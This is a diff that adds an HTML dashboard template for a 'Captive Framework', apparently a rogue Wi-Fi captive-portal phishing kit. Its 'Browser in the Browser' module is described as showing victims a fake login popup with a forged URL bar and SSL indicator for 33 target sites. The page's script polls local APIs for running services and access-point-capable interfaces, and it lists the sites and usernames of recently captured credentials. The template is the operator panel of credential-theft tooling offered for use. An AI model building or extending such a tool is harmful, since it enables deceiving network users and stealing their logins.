@@ -1,0 +1,105 @@
+{% extends "base.html" %}
+{% block title %}Dashboard - Captive Framework{% endblock %}
+{% block content %}
+<div class="page-header">
+    <h2>Dashboard</h2>
+    <p class="subtitle">Select a module to deploy</p>
+</div>
+
+<div class="module-cards">
+    <div class="module-card {% if active_module == 'bitb' %}card-active{% endif %}">
+        <div class="card-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+        </div>
+        <h3>Browser in the Browser</h3>
+        <p>Simulates a fake browser window inside a captive portal. Victims see a realistic login popup with custom URL bar and SSL indicator.</p>
+        <div class="card-features">
+            <span>33 Target Sites</span>
+            <span>UA Detection</span>
+            <span>Fake SSL Bar</span>
+        </div>
+        <div class="card-status">
+            {% if active_module == 'bitb' %}
+            <span class="badge badge-active">Running</span>
+            {% else %}
+            <span class="badge badge-idle">Idle</span>
+            {% endif %}
+        </div>
+        <a href="/module/bitb" class="btn btn-primary">Configure</a>
+    </div>
+</div>
+
+<div class="status-grid">
+    <div class="status-card">
+        <h4>Services</h4>
+        <div id="service-list" class="service-list">
+            <div class="loading-placeholder">Loading...</div>
+        </div>
+    </div>
+    <div class="status-card">
+        <h4>Network Interfaces</h4>
+        <div id="interface-list" class="service-list">
+            <div class="loading-placeholder">Loading...</div>
+        </div>
+    </div>
+    <div class="status-card">
+        <h4>Recent Credentials</h4>
+        <div id="recent-creds" class="service-list">
+            <div class="loading-placeholder">Loading...</div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    loadDashboardData();
+    setInterval(loadDashboardData, 5000);
+});
+
+function loadDashboardData() {
+    fetch("/api/status").then(r => r.json()).then(data => {
+        var html = "";
+        var services = data.services || {};
+        for (var name in services) {
+            var svc = services[name];
+            var running = svc !== null;
+            html += '<div class="service-item">';
+            html += '<span class="status-dot ' + (running ? "dot-active" : "dot-inactive") + '"></span>';
+            html += '<span>' + name + '</span>';
+            if (running) html += '<span class="service-pid">PID ' + svc.pid + '</span>';
+            html += '</div>';
+        }
+        document.getElementById("service-list").innerHTML = html || '<div class="empty-state">No services detected</div>';
+    }).catch(function() {
+        document.getElementById("service-list").innerHTML = '<div class="empty-state">Failed to load</div>';
+    });
+
+    fetch("/api/interfaces").then(r => r.json()).then(data => {
+        var html = "";
+        var allIfaces = (data.wifi || []).concat(data.network || []);
+        allIfaces.forEach(function(iface) {
+            html += '<div class="service-item">';
+            var isUp = iface.state === "UP" || iface.type === "managed" || iface.type === "AP";
+            html += '<span class="status-dot ' + (isUp ? "dot-active" : "dot-inactive") + '"></span>';
+            html += '<span>' + iface.name + '</span>';
+            if (iface.supports_ap) html += '<span class="badge badge-small">AP</span>';
+            if (iface.type) html += '<span class="service-pid">' + iface.type + '</span>';
+            html += '</div>';
+        });
+        document.getElementById("interface-list").innerHTML = html || '<div class="empty-state">No interfaces</div>';
+    }).catch(function() {});
+
+    fetch("/api/credentials").then(r => r.json()).then(data => {
+        var recent = data.slice(0, 5);
+        var html = "";
+        recent.forEach(function(c) {
+            html += '<div class="service-item">';
+            html += '<span class="badge badge-small">' + c.site + '</span>';
+            html += '<span>' + c.username + '</span>';
+            html += '</div>';
+        });
+        document.getElementById("recent-creds").innerHTML = html || '<div class="empty-state">No credentials captured</div>';
+    }).catch(function() {});
+}
+</script>
+{% endblock %}
